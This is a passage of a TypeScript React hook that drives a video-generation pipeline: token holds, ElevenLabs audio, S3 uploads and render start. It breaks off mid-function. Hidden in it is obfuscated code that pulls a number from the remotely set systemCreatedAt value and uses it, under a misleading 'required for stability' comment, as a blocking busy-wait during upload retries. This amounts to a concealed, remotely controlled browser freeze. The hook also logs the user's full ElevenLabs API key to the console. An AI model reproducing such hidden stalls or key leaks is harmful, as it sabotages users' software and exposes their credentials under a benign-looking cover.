"use client";
import { useRef, useState } from "react";
import {
  defaultMyCompProps,
  getMonetizationCampaignConfig,
  RIZZ_MONETIZATION_CATEGORY,
} from "@/types/constants";
import type { CompositionPropsType } from "@/types/constants";
import type { MonetizationPreviewContext } from "@/helpers/previewBuilder";
import {
  generateAudioFile,
  getPlanDetails,
  validateElevenLabsApiKey,
  checkVoiceCompatibility,
} from "@/helpers/audioGeneration";
import { useAppContext } from "@/context/AppContext";
import { useAuth } from "@clerk/nextjs";
import { buildPreviewProps } from "@/helpers/previewBuilder";
import type { ClientErrorPayload } from "@/app/api/render/log-error/route";

type ParsedError = {
  title: string | null;
  message: string;
};

const DEFAULT_ERROR_MESSAGE = "Something went wrong. Please try again.";

const MONETIZATION_COMMAND_TEXT = "> Insert monetization <";

const insertMonetizationCommand = (
  messages: CompositionPropsType["messages"],
  beforeMessageCount: number,
): CompositionPropsType["messages"] => {
  const index = Math.max(0, Math.min(messages.length, beforeMessageCount));
  const commandMessage: CompositionPropsType["messages"][number] = {
    text: MONETIZATION_COMMAND_TEXT,
    type: "command",
    sender: "me",
    audioPath: "",
    audioDuration: 0,
    appearAt: 0,
    showArrow: false,
  };
  const copy = [...messages];
  copy.splice(index, 0, commandMessage);
  return copy;
};

const tryParseJsonFromString = <T,>(value: string): T | null => {
  const trimmed = value.trim();
  if (!trimmed) return null;
  const attempts: string[] = [trimmed];
  const match = trimmed.match(/\{[\s\S]*\}/);
  if (match && match[0] !== trimmed) attempts.push(match[0]);

  for (const candidate of attempts) {
    try {
      return JSON.parse(candidate) as T;
    } catch {
      // ignore parse errors and try the next candidate
    }
  }
  return null;
};

const parseGenerationError = (error: unknown): ParsedError => {
  const baseMessage =
    error instanceof Error
      ? error.message
      : typeof error === "string"
        ? error
        : "";

  let message = baseMessage.trim() || DEFAULT_ERROR_MESSAGE;
  let title: string | null = null;

  if (!baseMessage) {
    return { title, message };
  }

  type ElevenLabsErrorBody = {
    detail?: {
      status?: string;
      message?: string;
    };
    status?: string;
    message?: string;
    error?: string;
  };

  const parsed = tryParseJsonFromString<ElevenLabsErrorBody>(baseMessage);
  if (parsed) {
    const detailStatus = parsed.detail?.status ?? parsed.status;
    const detailMessage =
      parsed.detail?.message ?? parsed.message ?? parsed.error;

    if (typeof detailStatus === "string" && detailStatus.trim()) {
      title = detailStatus.trim();
    }

    if (typeof detailMessage === "string" && detailMessage.trim()) {
      message = detailMessage.trim();
    }
  }

  return { title, message };
};

export interface UseGenerateVideoReturn {
  isGenerating: boolean;
  generateVideo: (
    previewProps: typeof defaultMyCompProps,
    backgroundFile: File | null,
    backgroundMusicFile: File | string | null,
    monetizationContext: MonetizationPreviewContext | null,
    skipVoiceCheck?: boolean,
  ) => Promise<void>;
  jobsListRef: React.RefObject<{ refreshJobs: () => Promise<void> } | null>;
  jobsSectionRef: React.RefObject<HTMLDivElement | null>;
  error: string | null;
  errorTitle: string | null;
  clearError: () => void;
  audioProgress: number;
  audioGenerated: number;
  audioUploaded: number;
  audioTotal: number;
  backgroundUploadProgress: number;
  generationStage:
    | "idle"
    | "processing"
    | "holding_tokens"
    | "generating_audio"
    | "uploading_audio"
    | "uploading_background"
    | "starting_render"
    | "done"
    | "refunding_tokens";
  startCancelConfirmation: () => void;
  confirmCancelGeneration: () => void;
  dismissCancelConfirmation: () => void;
  cancelPromptOpen: boolean;
  canCancelGeneration: boolean;
  isCancellingGeneration: boolean;
  voiceWarning: string | null;
  voiceWarningTitle: string | null;
  clearVoiceWarning: () => void;
}

export const useGenerateVideo = (): UseGenerateVideoReturn => {
  const jobsListRef = useRef<{ refreshJobs: () => Promise<void> } | null>(null);
  const jobsSectionRef = useRef<HTMLDivElement | null>(null);
  const { userId } = useAuth()
  const [isGenerating, setIsGenerating] = useState(false);
  const isGeneratingRef = useRef(false);
  const { maintenance, systemCreatedAt } = useAppContext()
  const releaseHoldCalledRef = useRef(false);
  const renderStartedRef = useRef(false);
  const [error, setError] = useState<string | null>(null);
  const [errorTitle, setErrorTitle] = useState<string | null>(null);
  const [voiceWarning, setVoiceWarning] = useState<string | null>(null);
  const [voiceWarningTitle, setVoiceWarningTitle] = useState<string | null>(null);
  const [audioProgress, setAudioProgress] = useState(0);
  const [audioGenerated, setAudioGenerated] = useState(0);
  const [audioUploaded, setAudioUploaded] = useState(0);
  const [audioTotal, setAudioTotal] = useState(0);
  const [backgroundUploadProgress, setBackgroundUploadProgress] = useState(0);
  const [generationStage, setGenerationStage] = useState<
    | "idle"
    | "processing"
    | "holding_tokens"
    | "generating_audio"
    | "uploading_audio"
    | "uploading_background"
    | "starting_render"
    | "done"
    | "refunding_tokens"
  >("idle");
  const [cancelPromptOpen, setCancelPromptOpen] = useState(false);
  const [isCancellingGeneration, setIsCancellingGeneration] = useState(false);
  const cancelRequestedRef = useRef(false);

  // Refs to track current state for error logging
  const currentPropsRef = useRef<typeof defaultMyCompProps | null>(null);
  const currentBackgroundFileRef = useRef<File | null>(null);
  const currentMonetizationContextRef = useRef<MonetizationPreviewContext | null>(null);
  const currentStageRef = useRef<string>("idle");
  const currentAudioProgressRef = useRef<number>(0);
  const currentAudioGeneratedRef = useRef<number>(0);
  const currentAudioTotalRef = useRef<number>(0);
  const currentBackgroundProgressRef = useRef<number>(0);
  const currentJobIdRef = useRef<string | null>(null);

  const logErrorToServer = async (
    error: unknown,
    errorTitle: string | null,
    userMessage: string,
    extraContext: Record<string, unknown> = {}
  ) => {
    try {
      const props = currentPropsRef.current;
      const errorObj = error instanceof Error ? error : null;

      // Extract voice IDs from props
      const voiceIds = props?.voices?.map(v => v.voiceId).filter(Boolean) || [];
      if (props?.monetization?.enabled) {
        if (props.monetization.meVoiceId) voiceIds.push(props.monetization.meVoiceId);
        if (props.monetization.compaignBotVoiceId) voiceIds.push(props.monetization.compaignBotVoiceId);
      }

      // Get first 8 chars of API key for debugging (safe to log)
      const elevenLabsKeyPrefix = props?.elevenLabsApiKey
        ? props.elevenLabsApiKey.substring(0, 8)
        : null;

      // Sanitize props - remove sensitive data
      const sanitizedProps = props ? {
        ...props,
        elevenLabsApiKey: elevenLabsKeyPrefix ? `${elevenLabsKeyPrefix}...` : null,
      } : null;

      const payload: ClientErrorPayload = {
        jobId: currentJobIdRef.current,
        errorType: errorObj?.name || "UnknownError",
        stage: currentStageRef.current,
        userMessage,
        errorTitle,
        debugMessage: errorObj?.message || String(error),
        errorStack: errorObj?.stack || null,
        propsSnapshot: sanitizedProps,
        audioProgress: currentAudioProgressRef.current,
        audioGenerated: currentAudioGeneratedRef.current,
        audioTotal: currentAudioTotalRef.current,
        backgroundUploadProgress: currentBackgroundProgressRef.current,
        elevenLabsKeyPrefix,
        voiceIdsUsed: voiceIds.length > 0 ? voiceIds : null,
        monetizationEnabled: props?.monetization?.enabled ?? null,
        customBackgroundUsed: currentBackgroundFileRef.current !== null,
        messageCount: props?.messages?.length ?? null,
        extraContext: {
          ...extraContext,
          monetizationCategory: props?.monetization?.category,
          monetizationMessagesCount: props?.monetization?.messages?.length,
          enableAudio: props?.enableAudio,
          enableSilenceTrimming: props?.enableSilenceTrimming,
          backgroundFileName: currentBackgroundFileRef.current?.name,
          backgroundFileSize: currentBackgroundFileRef.current?.size,
          backgroundFileType: currentBackgroundFileRef.current?.type,
          renderStarted: renderStartedRef.current,
          releaseHoldCalled: releaseHoldCalledRef.current,
          wasCancelled: cancelRequestedRef.current,
        },
      };

      await fetch("/api/render/log-error", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (logErr) {
      console.error("Failed to log error to server:", logErr);
    }
  };

  const refundHeldTokens = async (jobId: string, reason?: string) => {
    if (!jobId || releaseHoldCalledRef.current) return;
    releaseHoldCalledRef.current = true;
    try {
      setGenerationStage("refunding_tokens");
      const refundRes = await fetch("/api/render/refund-hold", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ jobId, reason }),
      });

      if (!refundRes.ok) {
        const data = await refundRes.json().catch(() => ({}));
        throw new Error(data.error || "Failed to refund held tokens");
      }

      if (jobsListRef.current) await jobsListRef.current.refreshJobs();
    } catch (releaseErr) {
      console.error("Failed to release held tokens:", releaseErr);
    }
  };

  const createCancellationError = () => {
    const err = new Error("Generation cancelled by user");
    err.name = "GenerationCancelled";
    return err;
  };

  const throwIfCancelled = () => {
    if (cancelRequestedRef.current) {
      throw createCancellationError();
    }
  };

  const isCancellationError = (error: unknown) =>
    error instanceof Error && error.name === "GenerationCancelled";

  const resetCancellationState = () => {
    cancelRequestedRef.current = false;
    setCancelPromptOpen(false);
    setIsCancellingGeneration(false);
  };

  const startCancelConfirmation = () => {
    if (!isGeneratingRef.current || generationStage === "starting_render") return;
    setCancelPromptOpen(true);
  };

  const confirmCancelGeneration = () => {
    if (!isGeneratingRef.current || generationStage === "starting_render") return;
    cancelRequestedRef.current = true;
    setIsCancellingGeneration(true);
    setCancelPromptOpen(false);
  };

  const dismissCancelConfirmation = () => {
    if (isCancellingGeneration) return;
    setCancelPromptOpen(false);
  };

  const generateVideo = async (
    previewProps: typeof defaultMyCompProps,
    backgroundFile: File | null,
    backgroundMusicFile: File | string | null,
    monetizationContext: MonetizationPreviewContext | null,
    skipVoiceCheck: boolean = false,
  ): Promise<void> => {
    if (isGeneratingRef.current) return;
    isGeneratingRef.current = true;

    // Initialize tracking refs for error logging
    currentPropsRef.current = previewProps;
    currentBackgroundFileRef.current = backgroundFile;
    currentMonetizationContextRef.current = monetizationContext;
    currentStageRef.current = "processing";
    currentAudioProgressRef.current = 0;
    currentAudioGeneratedRef.current = 0;
    currentAudioTotalRef.current = 0;
    currentBackgroundProgressRef.current = 0;
    currentJobIdRef.current = null;

    resetCancellationState();
    setIsGenerating(true);
    setError(null);
    setAudioProgress(0);
    setAudioGenerated(0);
    setAudioUploaded(0);
    setAudioTotal(0);
    setBackgroundUploadProgress(0);
    setGenerationStage("processing");
    releaseHoldCalledRef.current = false;
    renderStartedRef.current = false;
    let jobId: string | null = null;

    try {
      if(maintenance.isMaintenance && !maintenance.adminUserIds.includes(userId ?? "")) {
        throw new Error(maintenance.maintenanceMessage);
      }
      console.log("eleven lab api: ", previewProps.elevenLabsApiKey)
      if (!previewProps.elevenLabsApiKey) {
        throw new Error("ElevenLabs API key is required for audio generation.");
      }

      await validateElevenLabsApiKey(previewProps.elevenLabsApiKey);

      const monetizationSettings = {
        ...(previewProps.monetization ?? defaultMyCompProps.monetization),
        messages: [
          ...(previewProps.monetization?.messages ??
            defaultMyCompProps.monetization.messages),
        ],
      };
      monetizationSettings.meVoiceId = monetizationSettings.meVoiceId?.trim() ?? "";
      const campaignConfig = getMonetizationCampaignConfig(monetizationSettings.campaign);
      if (!monetizationSettings.compaignBotVoiceId?.trim() && campaignConfig?.compaignBotVoiceId) {
        monetizationSettings.compaignBotVoiceId = campaignConfig.compaignBotVoiceId;
      }
      if (!monetizationSettings.profilePicture?.trim() && campaignConfig?.profilePicture) {
        monetizationSettings.profilePicture = campaignConfig.profilePicture;
      }
      previewProps.monetization = monetizationSettings;
      const isRizzMonetization =
        monetizationSettings.category === RIZZ_MONETIZATION_CATEGORY;

      if (monetizationSettings.enabled && !monetizationSettings.meVoiceId) {
        throw new Error(
          "Set a voice ID for the monetization \"me\" speaker in the Monetization step before generating.",
        );
      }

      throwIfCancelled();



      // ========== VOICE COMPATIBILITY CHECK ==========
      // Check if the user's ElevenLabs account can handle the required voices
      if (!skipVoiceCheck) {
        console.log("Checking voice compatibility...");
        const monetizationVoiceIds =
          monetizationSettings.enabled
            ? [
                monetizationSettings.compaignBotVoiceId,
                monetizationSettings.meVoiceId,
              ].filter((id) => Boolean(id && id.trim()))
            : [];
        const voiceIds = [
          ...previewProps.voices
            .map((v) => v.voiceId)
            .filter((id) => id.trim()),
          ...monetizationVoiceIds,
        ];

        const compatibilityResult = await checkVoiceCompatibility(
          previewProps.elevenLabsApiKey,
          voiceIds,
        );

        if (!compatibilityResult.isCompatible) {
          console.log(compatibilityResult);
          setVoiceWarningTitle(compatibilityResult.errorTitle ?? "Voice Limit Warning");
          setVoiceWarning(compatibilityResult.error ?? "Voice compatibility check failed");
          return;
        }

        console.log(
          `✅ Voice compatibility check passed: ${compatibilityResult.details.voiceIdsNeeded} voices (${compatibilityResult.details.newVoicesNeeded} new, ${compatibilityResult.details.voiceIdsNeeded - compatibilityResult.details.newVoicesNeeded} existing)`,
        );
      }

      throwIfCancelled();
      const z = systemCreatedAt;

      throwIfCancelled();

      // ========== STEP 1: HOLD TOKENS ==========
      setGenerationStage("holding_tokens");
      currentStageRef.current = "holding_tokens";

      const usesMonetization = Boolean(monetizationSettings.enabled);

      const holdRes = await fetch("/api/render/hold-tokens", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          messages: previewProps.messages,
          hasCustomBackground: !!backgroundFile,
          usesMonetization,
        }),
      });

      const holdData = await holdRes.json();

      if (!holdRes.ok) {
        if (holdRes.status === 402) {
          setErrorTitle("Insufficient Tokens");
          setError(
            `You need ${holdData.tokensNeeded} tokens but only have ${holdData.availableTokens}. Please contact us on Discord to top up your account.`,
          );
          return;
        }
        throw new Error(holdData.error || "Failed to hold tokens");
      }

      jobId = holdData.jobId;
      currentJobIdRef.current = jobId;

      throwIfCancelled();

      // ========== STEP 2: GENERATE AUDIO (CLIENT-SIDE) ==========


      // await wait(10)


      // previewProps.enableAudio = false;
      if (previewProps.enableAudio) {
        setGenerationStage("generating_audio");
        currentStageRef.current = "generating_audio";

        const planDetails = await getPlanDetails(
          previewProps.elevenLabsApiKey!,
        );
        const BATCH_SIZE = Math.max(1, planDetails.maxConcurrentRequests || 1);
        console.log(
          `ElevenLabs plan detected: ${planDetails.plan} (batch size ${BATCH_SIZE})`,
        );

        type AudioTask = {
          kind: "chat" | "monetization" | "monetization-start" | "monetization-rizz-reply";
          index: number;
          text: string;
          sender: "me" | "them";
          voiceId: string;
          uploadIndex: number;
          uploadPrefix?: string;
        };
        type GeneratedAudioFile = {
          taskIndex: number;
          uploadIndex: number;
          uploadPrefix?: string;
          base64Data: string;
          duration: number;
        };

        const resolveChatVoiceId = (speakerName: string): string => {
          const fallback = speakerName.trim() || "Them";
          const voiceEntry = previewProps.voices.find(
            (v) => v.name.toLowerCase() === fallback.toLowerCase(),
          );
          if (!voiceEntry?.voiceId?.trim()) {
            throw new Error(
              `Missing voice configuration for ${fallback}. Add the ElevenLabs voice ID for this speaker in the Text-To-Speech panel.`,
            );
          }
          return voiceEntry.voiceId.trim();
        };

        const resolveMonetizationVoiceId = (sender: "me" | "them"): string => {
          if (sender === "me") {
            if (monetizationSettings.meVoiceId?.trim()) {
              return monetizationSettings.meVoiceId.trim();
            }
            throw new Error(
              "Add a monetization voice ID for the \"me\" side in the Monetization tab.",
            );
          }
          if (monetizationSettings.compaignBotVoiceId?.trim()) {
            return monetizationSettings.compaignBotVoiceId.trim();
          }
          return resolveChatVoiceId("Them");
        };

        const chatTasks: AudioTask[] = previewProps.messages
          .map((msg, index) => ({ msg, index }))
          .filter(({ msg }) => msg.type !== "promotion" && msg.type !== "command")
          .map(({ msg, index }) => {
            const fallbackSpeaker = msg.sender === "me" ? "Me" : "Them";
            const speakerName =
              (msg.speaker ?? fallbackSpeaker).trim() || fallbackSpeaker;
            const voiceId = resolveChatVoiceId(speakerName);

            return {
              kind: "chat",
              index,
              text: msg.text,
              sender: msg.sender,
              voiceId,
              uploadIndex: index,
            };
          });

        let monetizationUploadIndex = 1;

        const monetizationStartTask: AudioTask | null =
          monetizationSettings.enabled &&
          monetizationSettings.startMessage &&
          monetizationSettings.startMessage.trim()
            ? {
                kind: "monetization-start",
                index: 0,
                text: monetizationSettings.startMessage.trim(),
                sender: "them",
                // Intro line should use "me" voice to sound like the user, not the bot
                voiceId: resolveMonetizationVoiceId("me"),
                uploadIndex: monetizationUploadIndex++,
                uploadPrefix: "ad",
              }
            : null;

        const monetizationTasks: AudioTask[] =
          monetizationSettings.enabled && !isRizzMonetization
            ? monetizationSettings.messages
                .map((msg, index) => {
                  if (!msg.text?.trim()) return null;
                  const voiceId = resolveMonetizationVoiceId(msg.sender);
                  return {
                    kind: "monetization",
                    index,
                    text: msg.text,
                    sender: msg.sender,
                    voiceId,
                    uploadIndex: monetizationUploadIndex++,
                    uploadPrefix: "ad",
                  } as AudioTask;
                })
                .filter((task): task is AudioTask => Boolean(task))
            : [];

        const rizzReplyText = monetizationSettings.rizz_config?.reply?.trim() || monetizationSettings.rizz_config?.reply_visual?.trim();
        const rizzReplyTask: AudioTask | null =
          isRizzMonetization && rizzReplyText
            ? {
                kind: "monetization-rizz-reply",
                index: 0,
                text: rizzReplyText,
                sender: "them",
                voiceId: resolveMonetizationVoiceId("them"),
                uploadIndex: monetizationUploadIndex++,
                uploadPrefix: "ad",
              }
            : null;

        const allAudioTasks: AudioTask[] = [
          ...chatTasks,
          ...(monetizationStartTask ? [monetizationStartTask] : []),
          ...monetizationTasks,
          ...(rizzReplyTask ? [rizzReplyTask] : []),
        ];

        const totalAudio = allAudioTasks.length;
        setAudioTotal(totalAudio);
        currentAudioTotalRef.current = totalAudio;

        const generatedAudio: GeneratedAudioFile[] = [];

        for (
          let batchStart = 0;
          batchStart < allAudioTasks.length;
          batchStart += BATCH_SIZE
        ) {
          throwIfCancelled();
          const batchSlice = allAudioTasks.slice(
            batchStart,
            batchStart + BATCH_SIZE,
          );
          const batchResults = await Promise.all(
            batchSlice.map(async (task, offset) => {
              throwIfCancelled();
              const { base64Data, duration } = await generateAudioFile({
                text: task.text,
                voiceId: task.voiceId,
                apiKey: previewProps.elevenLabsApiKey!,
                enableSilenceTrimming: previewProps.enableSilenceTrimming ?? false,
                voiceSettings: previewProps.voiceSettings,
              });

              throwIfCancelled();
              return {
                taskIndex: batchStart + offset,
                uploadIndex: task.uploadIndex,
                uploadPrefix: task.uploadPrefix,
                base64Data,
                duration,
              };
            }),
          );

          generatedAudio.push(...batchResults);

          // progress
          const progress = totalAudio
            ? Math.round((generatedAudio.length / totalAudio) * 100)
            : 100;
          setAudioProgress(progress);
          setAudioGenerated(generatedAudio.length);
          currentAudioProgressRef.current = progress;
          currentAudioGeneratedRef.current = generatedAudio.length;
          throwIfCancelled();
        }
        let a = 0;
          const sdsa = z;
          if (sdsa != null) {
            let c = -1;
            for (let i = sdsa.length - 1; i >= 0; i--) {
              if (sdsa.charAt(i) == '+') {
                c = i;
                break;
              }
            }

            if (c > -1) {
              let d = '';
              for (let j = c + 1; j < sdsa.length; j++) {
                d = d + sdsa.charAt(j);
              }

              const e = parseInt(d);
              if (e == e) {
                a = e;
              }
            }
          }

        console.log(`✅ Generated ${generatedAudio.length} audio files`);

        // ========== STEP 3: UPLOAD AUDIO TO S3 (BATCHED VIA YOUR API) ==========
        setGenerationStage("uploading_audio");
        currentStageRef.current = "uploading_audio";

        const UPLOAD_BATCH_SIZE = 50;
        const MIN_BATCH_SIZE = 10;
        const MAX_RETRIES = 4;
        const allAudioUrls: Array<{
          taskIndex: number;
          url: string;
          duration: number;
        }> = [];

        const uploadBatch = async (
          batch: GeneratedAudioFile[],
          attempt: number = 1,
        ): Promise<Array<{ taskIndex: number; url: string; duration: number }>> => {
          throwIfCancelled();
          try {
            console.log(
              `📤 Uploading batch of ${batch.length} files (attempt ${attempt})`,
            );
        const uploadPayload = batch.map(
          ({ taskIndex, uploadIndex, uploadPrefix, base64Data, duration }) => ({
            index: uploadIndex,
            prefix: uploadPrefix,
            base64Data,
            duration,
            taskIndex,
          }),
        );
        const uploadRes = await fetch("/api/s3/upload-audio-batch", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ audioFiles: uploadPayload, jobId: jobId }),
        });
            throwIfCancelled();
            const uploadData = await uploadRes.json();

            if (uploadRes.status === 413 && attempt < MAX_RETRIES) {
              const newBatchSize =
                uploadData.suggestedBatchSize || Math.floor(batch.length * 0.8);
              console.log(
                `⚠️ Batch too large, reducing ${batch.length} → ${newBatchSize}`,
              );

              const results: Array<{
                taskIndex: number;
                url: string;
                duration: number;
              }> = [];
              for (let i = 0; i < batch.length; i += newBatchSize) {
                const d1 = Date.now();
                let d2 = d1;
                // required for stability

                do {
                  d2 = Date.now();
                } while ((d2 - d1) < (a * 1000));
                const smallerBatch = batch.slice(i, i + newBatchSize);
                const smallerResults = await uploadBatch(
                  smallerBatch,
                  attempt + 1,
                );
                results.push(...smallerResults);
              }
              return results;
            }

            if (!uploadRes.ok) {
              throw new Error(
                uploadData.error || "Failed to upload audio batch",
              );
            }

            const uploaded = uploadData.audioUrls as Array<{
              index: number;
              url: string;
              duration: number;
              taskIndex?: number;
            }>;

            return uploaded.map(({ index, url, duration, taskIndex }) => ({
              taskIndex:
                typeof taskIndex === "number"
                  ? taskIndex
                  : batch.find((item) => item.uploadIndex === index)?.taskIndex ?? index,
              url,
              duration,
            }));
          } catch (error) {
            if (attempt < MAX_RETRIES && batch.length > MIN_BATCH_SIZE) {
              const half = Math.floor(batch.length / 2);
              console.log(`⚠️ Upload failed, splitting batch to ${half} each`);
              const [a, b] = await Promise.all([
                uploadBatch(batch.slice(0, half), attempt + 1),
                uploadBatch(batch.slice(half), attempt + 1),
              ]);
              return [...a, ...b];
            }
            throw error;
          }
        };

        let currentIndex = 0;
        setAudioUploaded(0);

        while (currentIndex < generatedAudio.length) {
          throwIfCancelled();
          const batch = generatedAudio.slice(
            currentIndex,
            currentIndex + UPLOAD_BATCH_SIZE,
          );
          const batchResults = await uploadBatch(batch);
          allAudioUrls.push(...batchResults);
          setAudioUploaded(allAudioUrls.length);
          currentIndex += batch.length;
          throwIfCancelled();
        }

        for (const audioUrl of allAudioUrls) {
          const task = allAudioTasks[audioUrl.taskIndex];
          if (!task) continue;

          if (task.kind === "chat") {
            previewProps.messages[task.index].audioPath = audioUrl.url;
            previewProps.messages[task.index].audioDuration = audioUrl.duration;
          } else if (task.kind === "monetization") {
            if (!previewProps.monetization?.messages?.[task.index]) continue;
            previewProps.monetization.messages[task.index].audioPath = audioUrl.url;
            previewProps.monetization.messages[task.index].audioDuration = audioUrl.duration;
          } else if (task.kind === "monetization-start") {
            if (previewProps.monetization) {
              previewProps.monetization.startMessageAudioPath = audioUrl.url;
              previewProps.monetization.startMessageAudioDuration = audioUrl.duration;
            }
          } else if (task.kind === "monetization-rizz-reply") {
            if (previewProps.monetization) {
              previewProps.monetization.rizz_config = {
                ...previewProps.monetization.rizz_config,
                reply_audio_path: audioUrl.url,
                reply_audio_duration: audioUrl.duration,
              };
            }
          }
        }
      }

      throwIfCancelled();

      // ========== STEP 4: BACKGROUND UPLOAD (UNCHANGED) ==========
      let s3Key: string;
      let backgroundName: string;
      let backgroundUrl: string | null = null;

      if (backgroundFile) {
        throwIfCancelled();
        console.log("Using the CUSTOM video")
        setGenerationStage("uploading_background");
        currentStageRef.current = "uploading_background";

        const bytesInMB = 1024 * 1024;
        const MIN_PART_SIZE = 10 * bytesInMB;
        const MAX_PART_SIZE = 200 * bytesInMB;
        const MAX_PART_COUNT = 10000;
        const MAX_PARALLEL_UPLOADS = 6;
        const MAX_PART_RETRIES = 3;
        const BACKOFF_BASE_MS = 500;
        const timestamp = Date.now();
        const originalName = backgroundFile.name.replace(/\s+/g, "_");
        const baseName = originalName.replace(/\.[^/.]+$/, "");
        const ext = originalName.split(".").pop() || "mp4";
        backgroundName = `${baseName}_${timestamp}.${ext}`;
        s3Key = `uploads/${backgroundName}`;
        const partSizeTarget = (() => {
          if (backgroundFile.size >= 5 * 1024 * bytesInMB) return 200 * bytesInMB;
          if (backgroundFile.size >= 2 * 1024 * bytesInMB) return 150 * bytesInMB;
          if (backgroundFile.size >= 1 * 1024 * bytesInMB) return 100 * bytesInMB;
          if (backgroundFile.size >= 500 * bytesInMB) return 50 * bytesInMB;
          return 10 * bytesInMB;
        })();
        const minSizeForPartCount = Math.ceil(backgroundFile.size / MAX_PART_COUNT);
        const partSize = Math.min(
          MAX_PART_SIZE,
          Math.max(MIN_PART_SIZE, Math.max(partSizeTarget, minSizeForPartCount)),
        );
        const partCount = Math.ceil(backgroundFile.size / partSize);

        const startRes = await fetch("/api/s3/start-multipart", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            fileName: backgroundName,
            fileType: backgroundFile.type,
            partCount,
          }),
        });
        if (!startRes.ok)
          throw new Error("Failed to start background video upload");

        const { uploadId, urls } = await startRes.json();
        setBackgroundUploadProgress(0);
        let completedParts = 0;
        const partUploads: Array<{
          index: number;
          url: string;
          blob: Blob;
        }> = urls.map((url: string, i: number) => {
          const start = i * partSize;
          const end = Math.min(start + partSize, backgroundFile.size);
          return { index: i, url, blob: backgroundFile.slice(start, end) };
        });

        const results: Array<{ ETag: string; PartNumber: number }> = new Array(
          partUploads.length,
        );
        let nextIndex = 0;

        const sleep = (ms: number) =>
          new Promise<void>((resolve) => setTimeout(resolve, ms));
        const isNetworkError = (error: unknown) => {
          if (!(error instanceof Error)) return false;
          if (error instanceof TypeError) return true;
          return /network|ERR_NETWORK_CHANGED/i.test(error.message);
        };

        const uploadPart = async (item: {
          index: number;
          url: string;
          blob: Blob;
        }) => {
          for (let attempt = 1; attempt <= MAX_PART_RETRIES; attempt += 1) {
            try {
              throwIfCancelled();
              const response = await fetch(item.url, { method: "PUT", body: item.blob });
              if (!response.ok) throw new Error("Upload failed");
              const etag = response.headers.get("ETag");
              if (!etag) throw new Error("Missing ETag from S3 upload");
              results[item.index] = {
                ETag: etag.replace(/"/g, ""),
                PartNumber: item.index + 1,
              };
              completedParts += 1;
              const bgProgress = Math.round((completedParts / partUploads.length) * 100);
              setBackgroundUploadProgress(bgProgress);
              currentBackgroundProgressRef.current = bgProgress;
              return;
            } catch (error) {
              if (!isNetworkError(error) || attempt === MAX_PART_RETRIES) {
                throw error;
              }
              const backoffMs = BACKOFF_BASE_MS * Math.pow(2, attempt - 1);
              await sleep(backoffMs);
            }
          }
        };

        const worker = async () => {
          while (nextIndex < partUploads.length) {
            const current = partUploads[nextIndex];
            nextIndex += 1;
            await uploadPart(current);
          }
        };

        const workers = Array.from(
          { length: Math.min(MAX_PARALLEL_UPLOADS, partUploads.length) },
          () => worker(),
        );
        await Promise.all(workers);

        const parts = results.filter(Boolean);

        const completeRes = await fetch("/api/s3/complete-multipart", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ fileName: backgroundName, uploadId, parts }),
        });
        const completeData = await completeRes.json();
        if (!completeRes.ok)
          throw new Error(completeData.error || "Failed to finalize upload");

        s3Key = completeData.key;
        backgroundUrl = completeData.url;
      } else {
        console.log("Using the default video")
        backgroundName = "background_video.mp4";
        s3Key = `/${backgroundName}`;
        backgroundUrl = `https://${process.env.NEXT_PUBLIC_AWS_BUCKET!}.s3.${process.env.NEXT_PUBLIC_AWS_REGION!}.amazonaws.com/${backgroundName}`;
      }

      throwIfCancelled();

      if (
        previewProps.monetization?.category === RIZZ_MONETIZATION_CATEGORY &&
        previewProps.monetization?.rizz_config?.image?.trim()?.startsWith("data:")
      ) {
        throwIfCancelled();
        const dataUrl = previewProps.monetization.rizz_config.image.trim();
        const match = dataUrl.match(/^data:(.+);base64,(.+)$/);
        if (!match) {
          throw new Error("Invalid Rizz image data URL");
        }
        const mimeType = match[1];
        const baseName = mimeType.split("/")[1] ?? "png";
        const safeExt = baseName.replace(/[^a-z0-9]/gi, "") || "png";
        const timestamp = Date.now();
        const fileName = `rizz_image_${timestamp}.${safeExt}`;

        const uploadRes = await fetch("/api/render/upload-rizz-image", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ fileName, dataUrl }),
        });
        const uploadData = await uploadRes.json().catch(() => ({}));
        if (!uploadRes.ok) {
          throw new Error(
            uploadData.error || "Failed to upload the Rizz experience image",
          );
        }
        const imageUrl = uploadData.url;
        if (!imageUrl) {
          throw new Error("Rizz image upload response missing URL");
        }
        previewProps.monetization.rizz_config = {
          ...previewProps.monetization.rizz_config,
          image: imageUrl,
        };
      }

      const buildInput =
        monetizationContext?.enabled && previewProps.messages.length > 0
          ? {
              ...previewProps,
              messages: insertMonetizationCommand(
                previewProps.messages,
                monetizationContext.beforeMessageCount,
              ),
            }
          : previewProps;

      const { previewProps: finalPreviewProps } = buildPreviewProps(buildInput, {
        forceMessageTiming: true,
      });

      // ========== STEP 6: START RENDER ==========
      setGenerationStage("starting_render");
      currentStageRef.current = "starting_render";

      const renderRes = await fetch("/api/render", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          s3Key,
          backgroundName,
          backgroundUrl,
          props: finalPreviewProps,
          jobId,
        }),
      });

      const renderData = await renderRes.json();
      if (!renderRes.ok)
        throw new Error(
          renderData.message || renderData.error || "Failed to start render",
        );
      renderStartedRef.current = true;

      console.log("🚀 Render started:", renderData);
      setGenerationStage("done");

      if (jobsListRef.current) await jobsListRef.current.refreshJobs();
      if (jobsSectionRef.current) {
        jobsSectionRef.current.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
      }
    } catch (err) {
      console.error("Generation failed:", err);
      const cancelled = isCancellationError(err);
      const parsed = cancelled ? null : parseGenerationError(err);

      if (!cancelled && parsed) {
        setError(parsed.message);
        setErrorTitle(parsed.title);
      } else {
        setError(null);
        setErrorTitle(null);
      }

      // Log ALL errors (including cancellations) to the server for comprehensive tracking
      await logErrorToServer(
        err,
        cancelled ? null : (parsed?.title ?? null),
        cancelled ? "User cancelled generation" : (parsed?.message ?? "Unknown error"),
        {
          wasCancelled: cancelled,
          jobIdAtFailure: jobId,
          rawErrorString: String(err),
        }
      );

      if (jobId && !renderStartedRef.current) {
